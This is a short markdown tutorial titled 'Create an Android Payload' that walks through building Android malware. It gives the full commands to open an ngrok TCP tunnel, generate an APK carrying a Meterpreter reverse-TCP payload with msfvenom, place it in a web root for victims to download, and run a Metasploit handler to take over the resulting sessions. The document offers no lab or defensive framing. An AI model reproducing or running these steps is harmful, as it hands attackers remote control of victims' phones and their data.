## Create an Android Payload
- <b>Step.1 : </b> go to [ngrok](https://ngrok.com/) and Register
- <b>Step.2 : </b> Download and follow instructions

```
./ngrok tcp 4242
```

- <b>Step.3 : </b> Create Exploit .apk

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io LPORT=10662 R> /var/www/html/andy.apk
```

- <b>Step.4 : </b> Set meterpreter

```
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4242
show options
exploit
```

- <b> Meterpreter commands</b>

```
sessions
sessions -i 1
```
